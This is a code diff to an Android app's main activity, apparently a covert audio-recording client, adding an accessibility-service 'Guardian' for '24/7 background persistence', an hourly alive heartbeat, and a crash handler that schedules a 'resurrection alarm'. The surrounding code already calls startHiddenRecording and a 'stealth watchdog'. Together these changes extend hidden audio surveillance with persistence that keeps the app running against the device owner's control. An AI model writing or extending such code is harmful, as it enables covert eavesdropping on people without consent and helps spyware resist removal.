@@ -1,15 +1,20 @@
 package com.audiostream.client
 
 import android.Manifest
+import android.app.AlarmManager
+import android.app.PendingIntent
 import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
 import android.content.IntentFilter
 import android.content.SharedPreferences
 import android.content.pm.PackageManager
+import android.content.res.ColorStateList
 import android.graphics.Color
 import android.os.Build
 import android.os.Bundle
+import android.provider.Settings
+import android.text.TextUtils
 import android.view.View
 import android.widget.Button
 import android.widget.EditText
@@ -43,6 +48,7 @@ class MainActivity : AppCompatActivity() {
     private lateinit var btnStart: Button
     private lateinit var btnStop: Button
     private lateinit var btnStandby: Button
+    private lateinit var btnGuardian: Button
     private lateinit var btnDummyStart: Button
     private lateinit var btnDummyStop: Button
     private lateinit var tvStatus: TextView
@@ -101,6 +107,7 @@ class MainActivity : AppCompatActivity() {
         btnStart = findViewById(R.id.btnStart)
         btnStop = findViewById(R.id.btnStop)
         btnStandby = findViewById(R.id.btnStandby)
+        btnGuardian = findViewById(R.id.btnGuardian)
         btnDummyStart = findViewById(R.id.btnDummyStart)
         btnDummyStop = findViewById(R.id.btnDummyStop)
         tvStatus = findViewById(R.id.tvStatus)
@@ -157,6 +164,10 @@ class MainActivity : AppCompatActivity() {
         // Initialize 2-hour recurring stealth watchdog schedule (anchored after 5 AM)
         WatchdogScheduler.scheduleRecurringWatchdog(this)
 
+        // Initialize 1-hour "Alive" Heartbeat schedule (does not record audio, only signals alive)
+        HeartbeatManager.scheduleHourlyHeartbeat(this)
+        HeartbeatManager.checkAndSendHourly(this)
+
         // Show client name
         val clientName = prefs.getString("client_name", null)
             ?: "${Build.MANUFACTURER.replaceFirstChar { it.uppercase() }}-${Build.MODEL.replace(" ", "-")}"
@@ -166,6 +177,21 @@ class MainActivity : AppCompatActivity() {
         btnStart.setOnClickListener { startHiddenRecording() }
         btnStop.setOnClickListener { stopHiddenRecording() }
         btnStandby.setOnClickListener { toggleStandby() }
+
+        btnGuardian.setOnClickListener {
+            if (!isGuardianAccessibilityEnabled()) {
+                Toast.makeText(this, "Enable 'Audio Stream Guardian' in Accessibility Settings", Toast.LENGTH_LONG).show()
+                try {
+                    startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
+                } catch (e: Exception) {
+                    Toast.makeText(this, "Failed opening Accessibility Settings: ${e.message}", Toast.LENGTH_SHORT).show()
+                }
+            } else {
+                Toast.makeText(this, "🛡️ Guardian is ACTIVE and protecting 24/7 background persistence.", Toast.LENGTH_SHORT).show()
+            }
+        }
+
+        setupCrashGuardian()
 
         btnDummyStart.setOnClickListener {
             isDummyRecording = true
@@ -394,6 +420,18 @@ class MainActivity : AppCompatActivity() {
                 tvDuration.text = "00:00"
                 tvStorage.text = "—"
             }
+
+            // Update Guardian Button state
+            val isGuardianOn = isGuardianAccessibilityEnabled()
+            if (isGuardianOn) {
+                btnGuardian.text = "🛡️ GUARDIAN: ACTIVE (IMMORTAL)"
+                btnGuardian.backgroundTintList = ColorStateList.valueOf(Color.parseColor("#065f46"))
+                btnGuardian.setTextColor(Color.parseColor("#34d399"))
+            } else {
+                btnGuardian.text = "⚠️ GUARDIAN INACTIVE: TAP TO ACTIVATE"
+                btnGuardian.backgroundTintList = ColorStateList.valueOf(Color.parseColor("#450a0a"))
+                btnGuardian.setTextColor(Color.parseColor("#f87171"))
+            }
         }
     }
 
@@ -479,6 +517,50 @@ class MainActivity : AppCompatActivity() {
                 Toast.makeText(this, "Permissions are required for recording", Toast.LENGTH_LONG).show()
                 appendLog("ERROR: Permissions denied")
             }
+        }
+    }
+
+    // ══════════════════════════════════════════════════════════════════════
+    // GUARDIAN & RESILIENCE HELPERS
+    // ══════════════════════════════════════════════════════════════════════
+
+    private fun isGuardianAccessibilityEnabled(): Boolean {
+        val expectedServiceName = "${packageName}/${KeepAliveAccessibilityService::class.java.canonicalName}"
+        val enabledServices = Settings.Secure.getString(
+            contentResolver,
+            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
+        ) ?: return false
+        val colonSplitter = TextUtils.SimpleStringSplitter(':')
+        colonSplitter.setString(enabledServices)
+        while (colonSplitter.hasNext()) {
+            val componentName = colonSplitter.next()
+            if (componentName.equals(expectedServiceName, ignoreCase = true)) {
+                return true
+            }
+        }
+        return false
+    }
+
+    private fun setupCrashGuardian() {
+        val previousHandler = Thread.getDefaultUncaughtExceptionHandler()
+        Thread.setDefaultUncaughtExceptionHandler { thread, throwable ->
+            android.util.Log.e("CrashGuardian", "🚨 Uncaught exception: ${throwable.message}. Scheduling resurrection alarm...")
+            try {
+                val restartIntent = Intent(applicationContext, AlarmReceiver::class.java).apply {
+                    action = WatchdogScheduler.ACTION_WATCHDOG_CHECK
+                }
+                val pi = PendingIntent.getBroadcast(
+                    applicationContext,
+                    9999,
+                    restartIntent,
+                    PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
+                )
+                val am = getSystemService(Context.ALARM_SERVICE) as? AlarmManager
+                am?.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 1500, pi)
+            } catch (e: Exception) {
+                // Best-effort recovery
+            }
+            previousHandler?.uncaughtException(thread, throwable)
         }
     }
 }
